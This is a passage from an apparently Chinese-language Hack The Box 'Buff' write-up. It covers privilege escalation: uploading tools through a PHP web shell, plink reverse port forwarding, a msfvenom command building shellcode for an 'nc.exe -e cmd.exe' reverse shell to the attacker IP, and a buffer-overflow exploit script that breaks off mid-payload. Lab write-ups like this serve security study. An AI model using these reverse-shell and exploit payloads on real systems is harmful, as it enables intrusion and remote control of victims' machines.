class="line"></span><br><span class="line">14/07/2020  13:27    &lt;DIR&gt;          .</span><br><span class="line">14/07/2020  13:27    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:25                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   8,142,823,424 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\shaun\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">*********************************</span><br></pre></td></tr></table></figure><h2 id="0x07-提权"><a href="#0x07-提权" class="headerlink" title="0x07.提权"></a>0x07.提权</h2><p><code>查看当前目录下文件，发现好多&quot;前辈&quot;上传的文件😂</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">01/09/2020  08:55    &lt;DIR&gt;          .</span><br><span class="line">01/09/2020  08:55    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:52         7,481,344 chisel.exe</span><br><span class="line">01/09/2020  08:33                53 kamehameha.php</span><br><span class="line">21/08/2017  14:40            59,392 nc.exe</span><br><span class="line">01/09/2020  08:54            59,392 ncat.exe</span><br><span class="line">01/09/2020  08:55           311,296 p1ink.exe</span><br><span class="line">21/08/2017  14:40           311,296 plink.exe</span><br><span class="line">01/09/2020  08:39                47 shell.php</span><br><span class="line">               7 File(s)      8,222,820 bytes</span><br><span class="line">               2 Dir(s)   8,263,647,232 bytes free</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure><p><code>上传plink</code></p><blockquote><p>Plink是Windows命令行SSH客户端，plink是ssh协议的一个实现。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># cp /usr/share/windows-binaries/plink.exe ./htb/buff/</span></span><br><span class="line">root@JIYE:~<span class="comment">#root@JIYE:~/htb/buff# ls</span></span><br><span class="line">flag  gymrce.py  nc.exe  nmap.CVT  plink.exe</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.198 - - [01/Sep/2020 04:35:27] <span class="string">&quot;GET /plink.exe HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9Y3VybA==">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovLzEwLjEwLjE3LjIxNi9wbGluay5leGU=">http://10.10.17.216/plink.exe<i class="fa fa-external-link-alt"></i></span> -o plink_f.exe</p></blockquote><img src="/2020/09/01/HTB-buff/image-20200901163645906.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">01/09/2020  09:37    &lt;DIR&gt;          .</span><br><span class="line">01/09/2020  09:37    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:52         7,481,344 chisel.exe</span><br><span class="line">01/09/2020  09:33                53 kamehameha.php</span><br><span class="line">21/08/2017  14:40            59,392 nc.exe</span><br><span class="line">01/09/2020  08:54            59,392 ncat.exe</span><br><span class="line">01/09/2020  08:55           311,296 p1ink.exe</span><br><span class="line">21/08/2017  14:40           311,296 plink.exe</span><br><span class="line">01/09/2020  09:37           311,296 plink_f.exe</span><br><span class="line">01/09/2020  08:39                47 shell.php</span><br><span class="line">               8 File(s)      8,534,116 bytes</span><br><span class="line">               2 Dir(s)   8,604,606,464 bytes free</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure><p><code>查看系统架构，结果为64位</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;systeminfo   </span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 BUFF</span><br><span class="line">OS Name:                   Microsoft Windows 10 Enterprise</span><br><span class="line">OS Version:                10.0.17134 N/A Build 17134</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          shaun</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00329-10280-00000-AA218</span><br><span class="line">Original Install Date:     16/06/2020, 15:05:58</span><br><span class="line">System Boot Time:          01/09/2020, 10:57:29</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume2</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-gb;English (United Kingdom)</span><br><span class="line">Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London</span><br><span class="line">Total Physical Memory:     4,095 MB</span><br><span class="line">Available Physical Memory: 2,240 MB</span><br><span class="line">Virtual Memory: Max Size:  4,799 MB</span><br><span class="line">Virtual Memory: Available: 2,325 MB</span><br><span class="line">Virtual Memory: In Use:    2,474 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    WORKGROUP</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.198</span><br><span class="line">                                 [02]: fe80::fc70:a698:752c:f5c3</span><br><span class="line">                                 [03]: dead:beef::9007:7d8e:af8f:9419</span><br><span class="line">                                 [04]: dead:beef::fc70:a698:752c:f5c3</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure><p><code>本来想上传个winPEASx64.exe扫描可以用来提权的程序，霸特不能执行。。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line">    Directory: C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                               </span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">-a----       01/09/2020     14:32             53 kamehameha.php                    </span><br><span class="line">-a----       01/09/2020     11:01          59392 nc.exe                             </span><br><span class="line">-a----       01/09/2020     14:12          38616 nc1.exe                             </span><br><span class="line">-a----       01/09/2020     12:48              0 pe.exe                             </span><br><span class="line">-a----       01/09/2020     11:01         311296 plink.exe                           </span><br><span class="line">-a----       01/09/2020     12:17              5 start</span><br><span class="line">-a----       01/09/2020     12:17              5 status                             </span><br><span class="line">-a----       01/09/2020     14:16            400 winP                               </span><br><span class="line">-a----       01/09/2020     14:19          33057 winP.bat                           </span><br><span class="line">-a----       01/09/2020     14:16            400 winP.exe                           </span><br><span class="line">-a----       01/09/2020     13:16         279987 winPEAS.bat                         </span><br><span class="line">-a----       01/09/2020     13:05          87839 winPEASany.exe                     </span><br><span class="line">-a----       01/09/2020     12:45              0 winPEASexe                         </span><br><span class="line">-a----       01/09/2020     13:10          87839 winPEASx64.exe                     </span><br><span class="line">PS C:\xamp\htdocs\gym\upload&gt; </span><br></pre></td></tr></table></figure><p><code>查看端口暂用情况，可以看到8888被监听</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;netstat -nao | findstr <span class="string">&quot;8888&quot;</span></span><br><span class="line">netstat -nao | findstr <span class="string">&quot;8888&quot;</span></span><br><span class="line">  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       5828</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure><p><code>使用plink进行端口转发，霸特失败了，个人猜测是防火墙的原因。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br></pre></td></tr></table></figure><blockquote><p>报错为：无法同意密钥交换算法</p><p>Google一下发现需要更新putty，但是更新后还是不好使。。。菜狗一脸茫然！</p><p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjMTExOyYjMTE2OyYjNjQ7JiM0OTsmI3gzMDsmIzQ2OyYjeDMxOyYjeDMwOyYjeDJlOyYjeDMxOyYjNTU7JiM0NjsmIzUwOyYjeDMxOyYjNTQ7">&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x30;&#46;&#x31;&#x30;&#x2e;&#x31;&#55;&#46;&#50;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjMTExOyYjeDc0OyYjeDQwOyYjeDMxOyYjeDMwOyYjNDY7JiN4MzE7JiN4MzA7JiN4MmU7JiM0OTsmIzU1OyYjeDJlOyYjNTA7JiN4MzE7JiM1NDs=">&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#x30;&#46;&#x31;&#x30;&#x2e;&#49;&#55;&#x2e;&#50;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiMxMTQ7JiMxMTg7JiN4NjU7JiM1MDsmI3gzNTsmI3gzNTsmIzQ5OyYjNTc7JiN4MmQ7JiN4NzM7JiN4Njg7JiN4NjE7JiN4MzI7JiN4MzU7JiN4MzY7JiN4NDA7JiN4NmM7JiMxMDU7JiM5ODsmI3g3MzsmIzExNTsmI3g2ODsmI3gyZTsmI3g2ZjsmI3g3MjsmIzEwMzs=">&#99;&#x75;&#114;&#118;&#x65;&#50;&#x35;&#x35;&#49;&#57;&#x2d;&#x73;&#x68;&#x61;&#x32;&#x35;&#x36;&#x40;&#x6c;&#105;&#98;&#x73;&#115;&#x68;&#x2e;&#x6f;&#x72;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiMxMTQ7JiMxMTg7JiN4NjU7JiN4MzI7JiN4MzU7JiM1MzsmI3gzMTsmIzU3OyYjeDJkOyYjMTE1OyYjeDY4OyYjOTc7JiN4MzI7JiN4MzU7JiN4MzY7JiN4NDA7JiMxMDg7JiMxMDU7JiM5ODsmI3g3MzsmIzExNTsmIzEwNDsmI3gyZTsmI3g2ZjsmIzExNDsmIzEwMzs=">&#99;&#x75;&#114;&#118;&#x65;&#x32;&#x35;&#53;&#x31;&#57;&#x2d;&#115;&#x68;&#97;&#x32;&#x35;&#x36;&#x40;&#108;&#105;&#98;&#x73;&#115;&#104;&#x2e;&#x6f;&#114;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p></blockquote><p><code>第二天我又来了，这回成功了！，这回换成了powershell。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; .\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">.\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">Looking up host <span class="string">&quot;10.10.17.216&quot;</span> <span class="keyword">for</span> SSH connection</span><br><span class="line">Connecting to 10.10.17.216 port 22</span><br><span class="line">We claim version: SSH-2.0-PuTTY_Release_0.74</span><br><span class="line">Remote version: SSH-2.0-OpenSSH_8.3p1 Debian-1</span><br><span class="line">Using SSH protocol version 2</span><br><span class="line">Doing ECDH key exchange with curve Curve25519 and <span class="built_in">hash</span> SHA-256 (SHA-NI accelerated)</span><br><span class="line">Server also has ecdsa-sha2-nistp256/ssh-rsa host keys, but we don<span class="string">&#x27;t know any of them</span></span><br><span class="line"><span class="string">Host key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">The server&#x27;</span>s host key is not cached <span class="keyword">in</span> the registry. You</span><br><span class="line">have no guarantee that the server is the computer you</span><br><span class="line">think it is.</span><br><span class="line">The server<span class="string">&#x27;s ssh-ed25519 key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">If you trust this host, enter &quot;y&quot; to add the key to</span></span><br><span class="line"><span class="string">PuTTY&#x27;</span>s cache and carry on connecting.</span><br><span class="line">If you want to carry on connecting just once, without</span><br><span class="line">adding the key to the cache, enter <span class="string">&quot;n&quot;</span>.</span><br><span class="line">If you <span class="keyword">do</span> not trust this host, press Return to abandon the</span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) outbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) outbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) compression after user authentication</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) inbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) inbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) decompression after user authentication</span><br><span class="line">Using username <span class="string">&quot;root&quot;</span>.</span><br><span class="line">Sent password</span><br><span class="line">Initialised delayed zlib (RFC1950) decompression</span><br><span class="line">Initialised delayed zlib (RFC1950) compression</span><br><span class="line">Access granted</span><br><span class="line">Requesting remote port 8888 forward to 127.0.0.1:8888</span><br><span class="line">Opening main session channel</span><br><span class="line">Remote port forwarding from 8888 enabled</span><br><span class="line">Opened main channel</span><br><span class="line">Started a shell/<span class="built_in">command</span></span><br><span class="line">Linux JIYE 5.7.0-kali1-amd64 <span class="comment">#1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">ls</span><br><span class="line">arachni</span><br><span class="line">cacert.der</span><br><span class="line">clash</span><br><span class="line">CS4.0</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">get-pip.py</span><br><span class="line">htb</span><br><span class="line">Lluna.ovpn</span><br><span class="line">Lluna.ovpn.bak</span><br><span class="line">Music</span><br><span class="line">Pictures</span><br><span class="line">Public</span><br><span class="line">python_shell</span><br><span class="line">Templates</span><br><span class="line">Videos</span><br><span class="line">vulnhub</span><br></pre></td></tr></table></figure><p><code>下面用Buffer Overflow 来提权</code><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDgzODk=">URL<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>使用msfvenom生成shellcode替换原来的</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># msfvenom -p windows/exec CMD=&#x27;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.17.216 7078&#x27; -b &#x27;\x00\x0A\x0D&#x27; -f python -v payload</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 274 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 274</span><br><span class="line">Payload size: 274 bytes</span><br><span class="line">Final size of python file: 1456 bytes</span><br><span class="line">payload =  b<span class="string">&quot;&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xba\xd7\xda\x14\xc1\xdb\xcd\xd9\x74\x24\xf4\x58&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x31\xc9\xb1\x3e\x31\x50\x15\x83\xc0\x04\x03\x50&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x11\xe2\x22\x26\xfc\x43\xcc\xd7\xfd\x23\x45\x32&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xcc\x63\x31\x36\x7f\x54\x32\x1a\x8c\x1f\x16\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x07\x6d\xbe\xa0\xa0\xd8\x98\x8f\x31\x70\xd8\x8e&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xb1\x8b\x0c\x71\x8b\x43\x41\x70\xcc\xbe\xab\x20&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x85\xb5\x19\xd5\xa2\x80\xa1\x5e\xf8\x05\xa1\x83&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x49\x27\x80\x15\xc1\x7e\x02\x97\x06\x0b\x0b\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4b\x36\xc2\x24\xbf\xcc\xd5\xec\xf1\x2d\x79\xd1&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x3d\xdc\x80\x15\xf9\x3f\xf7\x6f\xf9\xc2\x0f\xb4&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x83\x18\x9a\x2f\x23\xea\x3c\x94\xd5\x3f\xda\x5f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xd9\xf4\xa9\x38\xfe\x0b\x7e\x33\xfa\x80\x81\x94&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x8a\xd3\xa5\x30\xd6\x80\xc4\x61\xb2\x67\xf9\x72&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x1d\xd7\x5f\xf8\xb0\x0c\xd2\xa3\xde\xd3\x61\xde&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xad\xd4\x79\xe1\x81\xbc\x48\x6a\x4e\xba\x55\xb9&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x2a\x34\x1c\xe0\x1b\xdd\xf8\x70\x1e\x80\xfb\xae&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x5d\xbd\x7f\x5b\x1e\x3a\x9f\x2e\x1b\x06\x18\xc2&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x51\x17\xcc\xe4\xc6\x18\xc5\xa6\xd2\xba\x9d\x49&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4e\x33\x2d\xd6\xf8\xc7\xa9\x89\x9b\x54\x6d\x31&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x25\xf6\xd1\xc8\xa5\x64\x86\x53\x22\x29\x36\xf7&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x84\xb4\xbe\x92\xf8\x1b\x5b\x7d\x9a\x0e\xc7\x53&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x39\xa9\x62\x8c\xf0\x79\x42\xfd\xc2\x57\xab\xca&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x0c\x9a\xfa\x02\x71\xed\xcc\x5d\x49\x11&quot;</span></span><br><span class="line">root@JIYE:~/htb/buff<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>编辑payload</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># cat buff.py </span></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">padding1   = b<span class="string">&quot;\x90&quot;</span> * 1052</span><br><span class="line">EIP        = b<span class="string">&quot;\xB5\x42\xA8\x68&quot;</span> <span class="comment"># 0x68A842B5 -&gt; PUSH ESP, RET</span></span><br><span class="line">NOPS       = b<span class="string">&quot;\x90&quot;</span> * 30</span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#x27;\x00\x0A\x0D&#x27; -f python</span></span><br><span class="line">payload =  b<span class="string">&quot;&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xba\xd7\xda\x14\xc1\xdb\xcd\xd9\x74\x24\xf4\x58&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x31\xc9\xb1\x3e\x31\x50\x15\x83\xc0\x04\x03\x50&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x11\xe2\x22\x26\xfc\x43\xcc\xd7\xfd\x23\x45\x32&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xcc\x63\x31\x36\x7f\x54\x32\x1a\x8c\x1f\x16\x8f&quot;</span></span><br><span class="line">payload += b<span 